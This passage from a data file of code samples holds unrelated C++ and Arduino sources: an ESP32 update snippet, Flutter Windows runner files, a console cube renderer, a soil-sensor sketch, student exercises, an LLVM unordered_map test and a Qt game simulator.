successfully\";\n          Serial.print(\"Data written successfully: \");\n          for (int i = 0; i < len; i++) {\n            Serial.print(data[i], HEX);\n            Serial.print(' '); // Add a space between hex values for better readability\n          }\n          Serial.println();\n\n        } else {\n          Serial.println(\"Write failed\");\n          msg_status = \"Data written successfully\";\n        }\n\n        file.close();\n\n        SIZE_OTA += len;  // Use 'len' instead of 'rxValue.length()'\n\n        if (FULL_PACKAGE == SIZE_OTA) {\n         // Print OTA success message\n          Serial.println(\"OTA SUCCESS\");\n\n          updateFromFS(LittleFS);\n\n          // Open the file for reading to get the file size\n          File read",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include <iostream>\n#include <Windows.h>\n#include \"Screen.h\"\n\nstruct pos {\n    int x;\n    int y;\n};\n\n//pos mapGridToScreen(int x, int y) {\n//    return \n//}\n\npos mapScreenToGrid(int x, int y) {\n    return { x / 2, y };\n}\n\nvoid gridInput(Screen& screen, int gridX, int gridY) {\n    screen.input('[', gridX*2, gridY);\n    screen.input(']', gridX*2 + 1, gridY);\n}\n\nvoid line(Screen& screen, int x1, int y1, int x2, int y2) {\n    char chr = '*';\n\n    float gradient = (float)(y2 - y1) / (x2 - x1);\n\n    int lengthX = abs(x2 - x1);\n    int lengthY = abs(y2 - y1);\n\n    pos leftPos;\n    if (x1 < x2) {\n        leftPos = { x1, y1 };\n    }\n    else {\n        leftPos = { x2, y2 };\n    }\n\n    pos topPos;\n    if (y1 < y2) {\n        topPos = { x1, y1 };\n    }\n    else {\n        topPos = { x2, y2 };\n    }\n\n    int minX;\n    if (x1 < x2) {\n        minX = x1;\n    }\n    else {\n        minX = x2;\n    }\n\n    int minY;\n    if (y1 < y2) {\n        minY = y1;\n    }\n    else {\n        minY = y2;\n    }\n    \n    if (lengthX == 0) {\n        for (int i = 0; i < lengthY + 1; i++) {\n            //screen.input(chr, x1, minY + i);\n            gridInput(screen, x1, minY + i);\n        }\n        return;\n    }\n\n    if (lengthY == 0) {\n        for (int i = 0; i < lengthX; i++) {\n            //screen.input(chr, minX + i, y1);\n            gridInput(screen, minX + i, y1);\n        }\n        return;\n    }\n\n    if (abs(gradient) < 1) {\n        for (int i = 0; i < lengthX + 1; i++) {\n            //screen.input(chr, leftPos.x + i, leftPos.y + round(i * gradient));\n            gridInput(screen, leftPos.x + i, leftPos.y + round(i * gradient));\n        }\n        return;\n    }\n\n    for (int i = 0; i < lengthY + 1; i++) {\n        //screen.input(chr, topPos.x + round(i * (1 / gradient)), topPos.y + i);\n        gridInput(screen, topPos.x + round(i * (1 / gradient)), topPos.y + i);\n    }\n}\n\nstruct vector3 {\n    float x;\n    float y;\n    float z;\n};\n\nclass Cuboid {\npublic:\n    vector3 nodes[8];\n    pos edges[12] = {\n        {0, 1}, {1, 2}, {2, 3}, {3, 0},\n        {4, 5}, {5, 6}, {6, 7}, {7, 4},\n        {0, 4}, {1, 5}, {2, 6}, {3, 7}\n    };\n\npublic:\n    Cuboid() {\n        for (int i = 0; i < 8; i++) {\n            nodes[i] = { 0, 0, 0 };\n        }\n    }\n\n    Cuboid(float x, float y, float z, float w, float h, float d) {\n        vector3 tempNodes[] = {\n            {x, y, z},\n            {x+w, y, z},\n            {x+w, y, z+d},\n            {x, y, z+d},\n            {x, y+h, z},\n            {x+w, y+h, z},\n            {x+w, y+h, z+d},\n            {x, y+h, z+d}\n        };\n\n        for (int i = 0; i < 8; i++) {\n            nodes[i] = tempNodes[i];\n        }\n    }\n\n    Cuboid(const Cuboid& cuboid) {\n        for (int i = 0; i < 8; i++) {\n            nodes[i] = cuboid.nodes[i];\n        }\n    }\n};\n\nvoid rotateZ3D(float theta, vector3 nodes[8]) {\n    float cosTheta = cos(theta);\n    float sinTheta = sin(theta);\n\n    for (int i = 0; i < 8; i++) {\n        float x = nodes[i].x;\n        float y = nodes[i].y;\n\n        nodes[i].x = x * cosTheta - y * sinTheta;\n        nodes[i].y = y * cosTheta + x * sinTheta;\n    }\n}\n\nvoid rotateX3D(float theta, vector3 nodes[8]) {\n    float cosTheta = cos(theta);\n    float sinTheta = sin(theta);\n\n    for (int i = 0; i < 8; i++) {\n        float y = nodes[i].y;\n        float z = nodes[i].z;\n\n        nodes[i].y = y * cosTheta + z * sinTheta;\n        nodes[i].z = z * cosTheta - y * sinTheta;\n    }\n}\n\nvoid rotateY3D(float theta, vector3 nodes[8]) {\n    float cosTheta = cos(theta);\n    float sinTheta = sin(theta);\n\n    for (int i = 0; i < 8; i++) {\n        float x = nodes[i].x;\n        float z = nodes[i].z;\n\n        nodes[i].x = x * cosTheta + z * sinTheta;\n        nodes[i].z = z * cosTheta - x * sinTheta;\n    }\n}\n\nint main() {\n    SetConsoleOutputCP(437);\n\n    HANDLE hout = GetStdHandle(STD_OUTPUT_HANDLE);\n    HANDLE hin = GetStdHandle(STD_INPUT_HANDLE);\n\n    DWORD consoleMode;\n    GetConsoleMode(hout, &consoleMode);\n    SetConsoleMode(hout, consoleMode | ENABLE_VIRTUAL_TERMINAL_PROCESSING);\n    SetConsoleMode(hin, ENABLE_EXTENDED_FLAGS | ENABLE_PROCESSED_INPUT | ENABLE_MOUSE_INPUT);\n\n    SHORT width = 200;\n    SHORT height = 50;\n\n    SMALL_RECT dim = { 0, 0, width - 1, height - 1 };\n\n    SetConsoleScreenBufferSize(hout, { width, height });\n\n    CONSOLE_FONT_INFOEX cfi;\n    cfi.cbSize = sizeof(CONSOLE_FONT_INFOEX);\n\n    GetCurrentConsoleFontEx(hout, false, &cfi);\n\n    cfi.dwFontSize.Y = 18;\n    cfi.dwFontSize.X = 10;\n\n    SetCurrentConsoleFontEx(hout, false, &cfi);\n\n    //pretty sure it only needs one redo, so no for loop check\n    if (!SetConsoleWindowInfo(hout, true, &dim)) {\n        cfi.dwFontSize.Y = 16;\n        cfi.dwFontSize.X = 9;\n\n        SetCurrentConsoleFontEx(hout, false, &cfi);\n\n        SetConsoleWindowInfo(hout, true, &dim);\n    }\n\n    INPUT_RECORD inputRecord;\n    DWORD events;\n\n    Screen screen = Screen(width, height);\n\n    //game ticks per second\n    int tickrate = 50;\n\n    int mouseX = 0;\n    int mouseY = 0;\n\n    Cuboid cube = Cuboid(-10, -",
    "#include <Arduino.h>\n\n// PARAMETROS\nint MAX = 2971;// MAX 2971  0 % MOLHADO\nint MIN = 1000;// MIN 1000 100% MOLHADO\n\n//PINOS\n#define SENSOR 35\n#define RED 5\n#define YELLOW 18\n#define GREEN 19\n#define LED_PIN 2\n\n\nvoid setup() {\n  Serial.begin(115200);\n  pinMode(SENSOR, INPUT);\n  pinMode(RED, OUTPUT);\n  pinMode(YELLOW, OUTPUT);\n  pinMode(GREEN, OUTPUT);\n  pinMode(LED_PIN, OUTPUT);\n}\n\nvoid loop() {\n  int leitura = analogRead(SENSOR);\n  int percentage = map(leitura, MIN, MAX, 100, 0);\n  Serial.println(percentage);\n  digitalWrite(LED_PIN, HIGH);\n  delay(50);\n  digitalWrite(LED_PIN, LOW);\n    if (percentage < 60) {\n    Serial.println(\"RED\");\n    digitalWrite(RED, HIGH);\n    digitalWrite(YELLOW, LOW);\n    digitalWrite(GREEN, LOW);\n  } else if (percentage >= 70 && percentage < 80) {\n    Serial.println(\"YELLOW\");\n    digitalWrite(RED, LOW);\n    digitalWrite(YELLOW, HIGH);\n    digitalWrite(GREEN, LOW);\n  } else {\n    Serial.println(\"GREEN\");\n    digitalWrite(RED, LOW);\n    digitalWrite(YELLOW, LOW);\n    digitalWrite(GREEN, HIGH);\n  }\n  delay(5*60*1000);\n}\n\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"todoapp\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "\ufeff#include <iostream>\n#include <conio.h>\nusing namespace std;\n\nint* Count(unsigned N, unsigned M, int T, int** numbers)\n{\n\tint mul = 1;\n\tint counter = 0;\n\tfor (unsigned i{}; i < N; i++)\n\t{\n\t\tfor (unsigned j{}; j < M; j++)\n\t\t{\n\t\t\tif (numbers[i][j] < T) {\n\t\t\t\tmul *= numbers[i][j];\n\t\t\t\tcounter++;\n\t\t\t}\n\t\t}\n\t\tcout << endl;\n\t}\n\tint* result{ new int[4]{counter, mul} };\n\treturn result;\n}\n\nvoid main()\n{\n\tunsigned N;\n\tunsigned M;\n\tcout << \"N,M = \";\n\tcin >> N >> M;\n\n\t// \u0418\u043d\u0438\u0446\u0438\u0430\u043b\u0438\u0437\u0430\u0446\u0438\u044f \u043c\u0430\u0441\u0441\u0438\u0432\u0430\n\tint** numbers{ new int* [N] {} };\n\tfor (unsigned i{}; i < N; i++)\n\t{\n\t\tnumbers[i] = new int[M] {};\n\t}\n\n\t// \u0417\u0430\u043f\u043e\u043b\u043d\u0435\u043d\u0438\u0435 \u043c\u0430\u0441\u0441\u0438\u0432\u0430\n\tfor (unsigned i{}; i < N; i++)\n\t{\n\t\tcout << \"Enter data for \" << (i + 1) << \" row\" << endl;\n\t\tfor (unsigned j{}; j < M; j++)\n\t\t{\n\t\t\tcout << (j + 1) << \" column: \";\n\t\t\tcin >> numbers[i][j];\n\t\t}\n\t}\n\n\t// \u0417\u0430\u043f\u0440\u043e\u0441 T\n\tint T;\n\tcout << \"T = \";\n\tcin >> T;\n\n\t// \u041f\u043e\u0434\u0441\u0447\u0451\u0442 \u0438 \u0432\u044b\u0432\u043e\u0434 \u0440\u0435\u0437\u0443\u043b\u044c\u0442\u0430\u0442\u0430\n\tint* result = Count(N, M, T, numbers);\n\tcout << \"amount of numbers < T = \" << result[0] << \"\\n\";\n\tcout << \"result of multiplying numbers < T = \" << result[1] << \"\\n\";\n\tsystem(\"pause\");\n}",
    "#include <iostream> <locale>\n\nusing namespace std;\nint main() {\n\tlocale::global(locale(\"pt_BR.UTF-8\"));\n\n\n\t//ATIVIDADE 1\n\t/*int numero = 1;\n\twhile (numero <= 10) {\n\t\tcout << numero << \"\\n\";\n\t\tnumero += 1;\n\t}*/\n\n\t\n\t//ATIVIDADE 2\n\t/*int tab1;\n\tcout << \"Informe um n\u00famero: \";\n\tcin >> tab1;\n\tfor (int j = 1; j <= 10; j++) {\n\t\tint resultado = tab1 * j;\n\t\tcout << resultado << \"\\n\";\n\t\tcout << tab1 << \" x \" << j << \" = \" << resultado << \"\\n\";\n\t}*/\n\n\n\t//ATIVIDADE 3\n\t/*int numero = 0;\n\twhile (numero <= 50) {\n\t\tcout << numero << \"\\n\";\n\t\tnumero += 5;\n\t}*/\n\n\n\t//ATIVIDADE 4\n\t/*int numero;\n\t\n\tfor (int i = 1; i <= 5; i++) {\n\t\tcout << \"Informe um n\u00famero: \";\n\t\tcin >> numero;\n\t\tif (numero <= 100){\n\t\t\tcout << \"N\u00famero comum\" << \"\\n\";\n\t\t}\n\t\telse if (numero > 100) {\n\t\t\tcout << \"N\u00daMERO ESPECIAL\" << \"\\n\";\n\t\t}\n\t}*/\n\n\n\t//ATIVIDADE 5\n\t/*int numero = 1;\n\twhile (numero <= 31) {\n\t\tcout << numero << \"\\n\";\n\t\tnumero += 2;\n\t}*/\n\t\n\n\t//ATIVIDADE 6\n\t/*int numero;\n\n\tfor (int i = 1; i <= 5; i++) {\n\t\tcout << \"Informe um n\u00famero: \";\n\t\tcin >> numero;\n\t\tif (numero > 0) {\n\t\t\tcout << \"N\u00famero Positivo\" << \"\\n\";\n\t\t}\n\t\telse if (numero < 0) {\n\t\t\tcout << \"N\u00famero Negativo\" << \"\\n\";\n\t\t}\n\t\telse {\n\t\t\tcout << \"O n\u00famero \u00e9 ZERO\" << \"\\n\";\n\t\t}\n\t}*/\n}",
    "//===----------------------------------------------------------------------===//\n//\n//                     The LLVM Compiler Infrastructure\n//\n// This file is dual licensed under the MIT and the University of Illinois Open\n// Source Licenses. See LICENSE.TXT for details.\n//\n//===----------------------------------------------------------------------===//\n\n// <unordered_map>\n\n// template <class Key, class T, class Hash, class Pred, class Alloc>\n// bool\n// operator==(const unordered_map<Key, T, Hash, Pred, Alloc>& x,\n//            const unordered_map<Key, T, Hash, Pred, Alloc>& y);\n//\n// template <class Key, class T, class Hash, class Pred, class Alloc>\n// bool\n// operator!=(const unordered_map<Key, T, Hash, Pred, Alloc>& x,\n//            const unordered_map<Key, T, Hash, Pred, Alloc>& y);\n\n#include <unordered_map>\n#include <string>\n#include <cassert>\n\n#include \"min_allocator.h\"\n\nint main()\n{\n    {\n        typedef std::unordered_map<int, std::string> C;\n        typedef std::pair<int, std::string> P;\n        P a[] =\n        {\n            P(10, \"ten\"),\n            P(20, \"twenty\"),\n            P(30, \"thirty\"),\n            P(40, \"forty\"),\n            P(50, \"fifty\"),\n            P(60, \"sixty\"),\n            P(70, \"seventy\"),\n            P(80, \"eighty\"),\n        };\n        const C c1(std::begin(a), std::end(a));\n        const C c2;\n        assert(!(c1 == c2));\n        assert( (c1 != c2));\n    }\n    {\n        typedef std::unordered_map<int, std::string> C;\n        typedef std::pair<int, std::string> P;\n        P a[] =\n        {\n            P(10, \"ten\"),\n            P(20, \"twenty\"),\n            P(30, \"thirty\"),\n            P(40, \"forty\"),\n            P(50, \"fifty\"),\n            P(60, \"sixty\"),\n            P(70, \"seventy\"),\n            P(80, \"eighty\"),\n        };\n        const C c1(std::begin(a), std::end(a));\n        const C c2 = c1;\n        assert( (c1 == c2));\n        assert(!(c1 != c2));\n    }\n    {\n        typedef std::unordered_map<int, std::string> C;\n        typedef std::pair<int, std::string> P;\n        P a[] =\n        {\n            P(10, \"ten\"),\n            P(20, \"twenty\"),\n            P(30, \"thirty\"),\n            P(40, \"forty\"),\n            P(50, \"fifty\"),\n            P(60, \"sixty\"),\n            P(70, \"seventy\"),\n            P(80, \"eighty\"),\n        };\n        C c1(std::begin(a), std::end(a));\n        C c2 = c1;\n        c2.rehash(30);\n        assert( (c1 == c2));\n        assert(!(c1 != c2));\n        c2.insert(P(90, \"ninety\"));\n        assert(!(c1 == c2));\n        assert( (c1 != c2));\n        c1.insert(P(90, \"ninety\"));\n        assert( (c1 == c2));\n        assert(!(c1 != c2));\n    }\n#if TEST_STD_VER >= 11\n    {\n        typedef std::unordered_map<int, std::string, std::hash<int>, std::equal_to<int>,\n                            min_allocator<std::pair<const int, std::string>>> C;\n        typedef std::pair<int, std::string> P;\n        P a[] =\n        {\n            P(10, \"ten\"),\n            P(20, \"twenty\"),\n            P(30, \"thirty\"),\n            P(40, \"forty\"),\n            P(50, \"fifty\"),\n            P(60, \"sixty\"),\n            P(70, \"seventy\"),\n            P(80, \"eighty\"),\n        };\n        const C c1(std::begin(a), std::end(a));\n        const C c2;\n        assert(!(c1 == c2));\n        assert( (c1 != c2));\n    }\n    {\n        typedef std::unordered_map<int, std::string, std::hash<int>, std::equal_to<int>,\n                            min_allocator<std::pair<const int, std::string>>> C;\n        typedef std::pair<int, std::string> P;\n        P a[] =\n        {\n            P(10, \"ten\"),\n            P(20, \"twenty\"),\n            P(30, \"thirty\"),\n            P(40, \"forty\"),\n            P(50, \"fifty\"),\n            P(60, \"sixty\"),\n            P(70, \"seventy\"),\n            P(80, \"eighty\"),\n        };\n        const C c1(std::begin(a), std::end(a));\n        const C c2 = c1;\n        assert( (c1 == c2));\n        assert(!(c1 != c2));\n    }\n    {\n        typedef std::unordered_map<int, std::string, std::hash<int>, std::equal_to<int>,\n                            min_allocator<std::pair<const int, std::string>>> C;\n        typedef std::pair<int, std::string> P;\n        P a[] =\n        {\n            P(10, \"ten\"),\n            P(20, \"twenty\"),\n            P(30, \"thirty\"),\n            P(40, \"forty\"),\n            P(50, \"fifty\"),\n            P(60, \"sixty\"),\n            P(70, \"seventy\"),\n            P(80, \"eighty\"),\n        };\n        C c1(std::begin(a), std::end(a));\n        C c2 = c1;\n        c2.rehash(30);\n        assert( (c1 == c2));\n        assert(!(c1 != c2));\n        c2.insert(P(90, \"ninety\"));\n        assert(!(c1 == c2));\n        assert( (c1 != c2));\n        c1.insert(P(90, \"ninety\"));\n        assert( (c1 == c2));\n        assert(!(c1 != c2));\n    }\n#endif\n}\n",
    "#include <iostream>\n#include <string>\n\nint main() {\n    const int NUM_FLATS = 10;\n    const int NUM_QUERIES = 3;\n\n    std::string surnames[NUM_FLATS];\n\n    std::cout << \"Enter the names of \" << NUM_FLATS << \" flats:\" << std::endl;\n    for (int i = 0; i < NUM_FLATS; ++i) {\n        std::cin >> surnames[i]; \n    }\n\n    std::cout << \"Enter \" << NUM_QUERIES << \" flat numbers to query:\" << std::endl;\n    for (int i = 0; i < NUM_QUERIES; ++i) {\n        int apartment_number;\n        std::cin >> apartment_number;\n        if (std::cin.fail()) {\n            std::cin.clear();  \n            std::cin.ignore(100, '\\n');  \n            std::cout << \"Invalid input. Please enter a valid number from 1 to ten.\" << std::endl;\n            --i; \n            continue;\n        }\n\n        if (apartment_number > NUM_FLATS || apartment_number < 1) {\n            std::cout << \"There is no flat with this number.\" << std::endl;\n        } else {\n            std::cout << surnames[apartment_number - 1] << std::endl;\n        }\n    }\n\n    return 0;\n}",
    "#include \"syw.h\"\r\n#include \"ui_syw.h\"\r\n#include<QIcon>\r\n#include<QTime>\r\n#include<QtGlobal>\r\n\r\nSYW::SYW(QWidget *parent) :\r\n    QWidget(parent),\r\n    ui(new Ui::SYW)\r\n{\r\n    ui->setupUi(this);\r\n    setWindowTitle(\"\u5723\u9057\u7269\u5f3a\u5316\u6a21\u62df\u5668\");\r\n    QIcon winicon(\"D:\\\\QT_Project\\\\Cppbigwork\\\\02\");\r\n    setWindowIcon(winicon);\r\n\r\n    QTime time=QTime::currentTime();\r\n    qsrand(time.msec()*1000+time.second()*1000);\r\n    kind=qrand()%5+4;\r\n\r\n    guan=qrand()%100+1;\r\n\r\n    QString n=QString::number(kind);\r\n    QString str=\"D:\\\\QT_Project\\\\Cppbigwork\\\\0\";\r\n    str+=n;\r\n\r\n    ui->label->setPixmap(QPixmap(str));\r\n\r\n    QFont font1;\r\n    font1.setFamily(\"\u534e\u6587\u65b0\u9b4f\");\r\n    font1.setPointSize(14);\r\n    ui->mainAttribute->setFont(font1);\r\n\r\n    QFont font2;\r\n    font1.setFamily(\"\u534e\u6587\u65b0\u9b4f\");\r\n    font1.setPointSize(18);\r\n    ui->name->setFont(font1);\r\n\r\n    level=0;\r\n    for(int i=0;i<10;i++)\r\n        sumatt[i]=0;\r\n    for(int i=0;i<40;i++)\r\n        countatt[i]=0;\r\n\r\n    int att[4];\r\n    int flag[4];\r\n    att[0]=qrand()%40+1;\r\n    countatt[att[0]-1]++;\r\n    flag[0]=checkKind(att[0]);\r\n\r\n    flag[1]=flag[0];\r\n    flag[2]=flag[0];\r\n    flag[3]=flag[0];\r\n\r\n    while(flag[1]==flag[0])\r\n    {\r\n       att[1]=qrand()%40+1;\r\n       flag[1]=checkKind(att[1]);\r\n    }\r\n    countatt[att[1]-1]++;\r\n    while(flag[2]==flag[0]||flag[2]==flag[1])\r\n    {\r\n       att[2]=qrand()%40+1;\r\n       flag[2]=checkKind(att[2]);\r\n    }\r\n    countatt[att[2]-1]++;\r\n    while(flag[3]==flag[0]||flag[3]==flag[1]||flag[3]==flag[2])\r\n    {\r\n       att[3]=qrand()%40+1;\r\n       flag[3]=checkKind(att[3]);\r\n    }\r\n    countatt[att[3]-1]++;\r\n\r\n    calsumatt(countatt);\r\n    for(int i=0;i<10;i++)\r\n    {\r\n        if(sumatt[i]!=0)\r\n        {\r\n            a=i;\r\n            break;\r\n        }\r\n    }\r\n    for(int i=a+1;i<10;i++)\r\n    {\r\n        if(sumatt[i]!=0)\r\n        {\r\n            b=i;\r\n            break;\r\n        }\r\n    }\r\n    for(int i=b+1;i<10;i++)\r\n    {\r\n        if(sumatt[i]!=0)\r\n        {\r\n            c=i;\r\n            break;\r\n        }\r\n    }\r\n    for(int i=c+1;i<10;i++)\r\n    {\r\n        if(sumatt[i]!=0)\r\n        {\r\n            d=i;\r\n            break;\r\n        }\r\n    }\r\n\r\n    printatt();\r\n\r\n    QTime time1=QTime::currentTime();\r\n    qsrand(time1.msec()*1000+time1.second()*1000);\r\n    this->isExist=qrand()%10+1;\r\n\r\n    showname();\r\n    showmainatt();\r\n\r\n\r\n}\r\nvoid SYW::showname()\r\n{\r\n    switch(kind)\r\n    {\r\n        case 4:{\r\n        ui->name->setText(QString(\"\u660e\u5a01\u4e4b\u9561 +%1\").arg(level));\r\n        break;\r\n    }\r\n    case 5:{\r\n        ui->name->setText(QString(\"\u534e\u9970\u4e4b\u515c +%1\").arg(level));\r\n        break;\r\n    }\r\n    case 6:{\r\n        ui->name->setText(QString(\"\u96f7\u4e91\u4e4b\u7b3c +%1\").arg(level));\r\n        int M=qrand()%30+1;\r\n        if(M<=8)\r\n            ui->mainAttribute->setText(\"\u751f\u547d\u503c 7.0%\");\r\n        else if(M<=16)\r\n            ui->mainAttribute->setText(\"\u653b\u51fb\u529b 7.0%\");\r\n        else if(M<=24)\r\n            ui->mainAttribute->setText(\"\u9632\u5fa1\u529b 8.7%\");\r\n        else if(M<=27)\r\n            ui->mainAttribute->setText(\"\u5143\u7d20\u7cbe\u901a 28\");\r\n        else\r\n            ui->mainAttribute->setText(\"\u5143\u7d20\u5145\u80fd\u6548\u7387 7.8%\");\r\n        break;}\r\n    case 7:{\r\n        ui->name->setText(QString(\"\u5207\u843d\u4e4b\u7fbd +%1\").arg(level));\r\n        ui->mainAttribute->setText(\"\u653b\u51fb\u529b 47\");\r\n        break;}\r\n    case 8:{\r\n        ui->name->setText(QString(\"\u7eef\u82b1\u4e4b\u58f6 +%1\").arg(level));\r\n        int M=qrand()%100000+1;\r\n        if(M<=17)\r\n            ui->mainAttribute->setText(\"\u751f\u547d\u503c 7.0%\");\r\n        else if(M<=34)\r\n            ui->mainAttribute->setText(\"\u653b\u51fb\u529b 7.0%\");\r\n        else if(M<=50)\r\n            ui->mainAttribute->setText(\"\u9632\u5fa1\u529b 8.7%\");\r\n        else if(M<=52)\r\n            ui->mainAttribute->setText(\"\u5143\u7d20\u7cbe\u901a 28\");\r\n        else if(M<=56)\r\n            ui->mainAttribute->setText(\"\u706b\u5143\u7d20\u4f24\u5bb3\u52a0\u6210 7.0%\");\r\n        else if(M<=60)\r\n            ui->mainAttribute->setText(\"\u6c34\u5143\u7d20\u4f24\u5bb3\u52a0\u6210 7.0%\");\r\n        else if(M<=64)\r\n            ui->mainAttribute->setText(\"\u96f7\u5143\u7d20\u4f24\u5bb3\u52a0\u6210 7.0%\");\r\n        else if(M<=68)\r\n            ui->mainAttribute->setText(\"\u51b0\u5143\u7d20\u4f24\u5bb3\u52a0\u6210 7.0%\");\r\n        else if(M<=72)\r\n            ui->mainAttribute->setText(\"\u5ca9\u5143\u7d20\u4f24\u5bb3\u52a0\u6210 7.0%\");\r\n        else if(M<=56)\r\n            ui->mainAttribute->setText(\"\u8349\u5143\u7d20\u4f24\u5bb3\u52a0\u6210 7.0%\");\r\n        else\r\n            ui->mainAttribute->setText(\"\u98ce\u5143\u7d20\u4f24\u5bb3\u52a0\u6210 7.0%\");\r\n        break;}\r\n    }\r\n}\r\n\r\nvoid SYW::showmainatt()\r\n{\r\n    if(kind==4)\r\n    {\r\n        ui->mainAttribute->setText(QString(\"\u751f\u547d\u503c %1\").arg(int(717+812.6*level)));\r\n    }\r\n    else if(kind==5)\r\n    {\r\n        if(guan<=22)\r\n            ui->mainAttribute->setText(QString(\"\u751f\u547d\u503c %1\").arg(7.0+level*7.92,1)+\"%\");\r\n        else if(guan<=44)\r\n            ui->mainAttribute->setText(QString(\"\u653b\u51fb\u529b %1\").arg(7.0+level*7.92,1)+\"%\");\r\n        else if(guan<=66)\r\n            ui->mainAttribute->setText(QString(\"\u9632\u5fa1\u529b %1\").arg(7.0+level*9.92,1)+\"%\");\r\n        else if(guan<=76)\r\n            